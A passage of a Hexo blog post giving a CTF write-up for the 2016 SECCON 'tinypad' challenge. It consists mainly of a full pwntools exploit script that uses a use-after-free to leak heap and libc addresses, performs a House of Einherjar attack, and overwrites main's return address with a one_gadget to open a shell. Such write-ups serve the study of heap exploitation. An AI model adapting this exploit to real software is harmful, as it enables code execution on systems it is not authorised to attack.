class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#libc 2.23</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">context(os=<span class="string">'liunx'</span>,arch = <span class="string">'amd64'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./tinypad.dms'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./tinypad.dms'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'(CMD)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'A'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(SIZE)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'(CONTENT)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'(CMD)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'D'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(INDEX)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'(CMD)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'E'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(INDEX)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'(CONTENT)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(<span class="string">'Is it OK?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'Y'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#step1 : leak heap addr</span></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">'a'</span>*<span class="number">8</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">'b'</span>*<span class="number">8</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">'c'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#UAF</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">1</span>)<span class="comment">#now fastbin-&gt;1-&gt;2</span></span><br><span class="line">    p.recvuntil(<span class="string">' # CONTENT: '</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>)  <span class="comment"># get pointer point to 2</span></span><br><span class="line">    heap_base = u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x80</span></span><br><span class="line">    log.success(<span class="string">'get heap base: '</span> + hex(heap_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#step 2 : leak libc address</span></span><br><span class="line">    delete(<span class="number">3</span>)<span class="comment"># 1,2,3 will consolidate, the merged new chunk'fd = bk = unsorted bin's main_arena addr</span></span><br><span class="line">    p.recvuntil(<span class="string">' # CONTENT: '</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    unsorted_offset_arena = <span class="number">8</span> + <span class="number">10</span> * <span class="number">8</span></span><br><span class="line">    main_arena = u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - unsorted_offset_arena</span><br><span class="line">    libc_base = main_arena - main_arena_offset</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">		<span class="comment">#step 2: house of Einherger</span></span><br><span class="line">    add(<span class="number">0x18</span>, <span class="string">'a'</span> * <span class="number">0x18</span>)  <span class="comment"># idx 0</span></span><br><span class="line">    <span class="comment"># we would like trigger house of einherjar at idx 1</span></span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'b'</span> * <span class="number">0xf8</span> + <span class="string">'\x11'</span>)  <span class="comment"># idx 1</span></span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'c'</span> * <span class="number">0xf8</span>)  <span class="comment"># idx 2</span></span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'d'</span> * <span class="number">0xf8</span>)  <span class="comment">#idx 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># create a fake chunk in tinypad's 0x100 buffer, offset 0x20</span></span><br><span class="line">    tinypad_addr = <span class="number">0x602040</span></span><br><span class="line">    fakechunk_addr = tinypad_addr + <span class="number">0x20</span></span><br><span class="line">    fakechunk_size = <span class="number">0x101</span></span><br><span class="line">    fakechunk = p64(<span class="number">0</span>) + p64(fakechunk_size) + p64(fakechunk_addr) + p64(</span><br><span class="line">        fakechunk_addr)</span><br><span class="line">    edit(<span class="number">3</span>, <span class="string">'d'</span> * <span class="number">0x20</span> + fakechunk)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite idx 1's prev_size and</span></span><br><span class="line">    <span class="comment"># set minaddr of size to '\x00'</span></span><br><span class="line">    <span class="comment"># idx 0's chunk size is 0x20</span></span><br><span class="line">    diff = heap_base + <span class="number">0x20</span> - fakechunk_addr</span><br><span class="line">    log.info(<span class="string">'diff between idx1 and fakechunk: '</span> + hex(diff))</span><br><span class="line">    <span class="comment"># '\0' padding caused by strcpy</span></span><br><span class="line">    diff_strip = p64(diff).strip(<span class="string">'\0'</span>)</span><br><span class="line">    number_of_zeros = len(p64(diff)) - len(diff_strip)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(number_of_zeros + <span class="number">1</span>):</span><br><span class="line">        data = diff_strip.rjust(<span class="number">0x18</span> - i, <span class="string">'f'</span>)</span><br><span class="line">        edit(<span class="number">1</span>, data)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nDeleted.'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fix the fake chunk size, fd and bk</span></span><br><span class="line">    <span class="comment"># fd and bk must be unsorted bin</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">'d'</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(main_arena + <span class="number">88</span>) +</span><br><span class="line">         p64(main_arena + <span class="number">88</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. overwrite malloc_hook with one_gadget</span></span><br><span class="line"></span><br><span class="line">    one_gadget_addr = libc_base + <span class="number">0x45216</span></span><br><span class="line">    environ_pointer = libc_base + libc.symbols[<span class="string">'__environ'</span>]</span><br><span class="line">    log.info(<span class="string">'one gadget addr: '</span> + hex(one_gadget_addr))</span><br><span class="line">    log.info(<span class="string">'environ pointer addr: '</span> + hex(environ_pointer))</span><br><span class="line">    <span class="comment">#fake_malloc_chunk = main_arena - 60 + 9</span></span><br><span class="line">    <span class="comment"># set memo[0].size = 'a'*8,</span></span><br><span class="line">    <span class="comment"># set memo[0].content point to environ to leak environ addr</span></span><br><span class="line">    fake_pad = <span class="string">'f'</span> * (<span class="number">0x100</span> - <span class="number">0x20</span> - <span class="number">0x10</span>) + <span class="string">'a'</span> * <span class="number">8</span> + p64(</span><br><span class="line">        environ_pointer) + <span class="string">'a'</span> * <span class="number">8</span> + p64(<span class="number">0x602148</span>)</span><br><span class="line">    <span class="comment"># get a fake chunk</span></span><br><span class="line">    add(<span class="number">0x100</span> - <span class="number">8</span>, fake_pad)  <span class="comment"># idx 2</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get environ addr</span></span><br><span class="line">    p.recvuntil(<span class="string">' # CONTENT: '</span>)</span><br><span class="line">    environ_addr = p.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    environ_addr = u64(environ_addr)</span><br><span class="line">    main_ret_addr = environ_addr - <span class="number">30</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># set memo[0].content point to main_ret_addr</span></span><br><span class="line">    edit(<span class="number">2</span>, p64(main_ret_addr))</span><br><span class="line">    <span class="comment"># overwrite main_ret_addr with one_gadget addr</span></span><br><span class="line">    edit(<span class="number">1</span>, p64(one_gadget_addr))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
+<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_einherjar-zh/#2016-seccon-tinypadhttps://blog.csdn.net/qq_33528164/article/details/79993399" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_einherjar-zh/#2016-seccon-tinypadhttps://blog.csdn.net/qq_33528164/article/details/79993399</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    v1cky01dxp
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="https://v1ckydxp.github.io/archives/2019/07/07/House_Of_Einherjar--2016-Seccon-tinypad-writeup/" title="House_Of_Einherjar - 2016 Seccon tinypad writeup">https://v1ckydxp.github.io/archives/2019/07/07/House_Of_Einherjar--2016-Seccon-tinypad-writeup/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://v1ckydxp.github.io" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/House-Of-Einherjar-pwn/" rel="tag"># House_Of_Einherjar pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/05/HITCON_2018_PWN_baby_tcache-writeup/" rel="next" title="HITCON_2018_PWN_baby_tcache writeup">
+                <i class="fa fa-chevron-left"></i> HITCON_2018_PWN_baby_tcache writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/09/2019_KCTF_绝地逃生_writeup/" rel="prev" title="2019 KCTF 绝地逃生 writeup">
+                2019 KCTF 绝地逃生 writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">v1cky01dxp</p>
+	      <img class="site-author-image" itemprop="image" src="/images/head.jpeg" alt="v1cky01dxp">
+	      <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/v1ckydxp" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:sunshinedxp@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#House-Of-Einherjar-原理"><span class="nav-number">1.</span> <span class="nav-text">House_Of_Einherjar 原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2016-Seccon-tiny-pad-writeup"><span class="nav-number">2.</span> <span class="nav-text">2016 Seccon tiny pad writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#程序基本信息"><span class="nav-number">2.1.</span> <span class="nav-text">程序基本信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#程序基本功能逻辑"><span class="nav-number">2.2.</span> <span class="nav-text">程序基本功能逻辑</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用过程"><span class="nav-number">2.3.</span> <span class="nav-text">利用过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp"><span class="nav-number">2.4.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#reference"><span class="nav-number">2.5.</span> <span class="nav-text">reference</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">v1cky01dxp</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">35.8k</span>
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
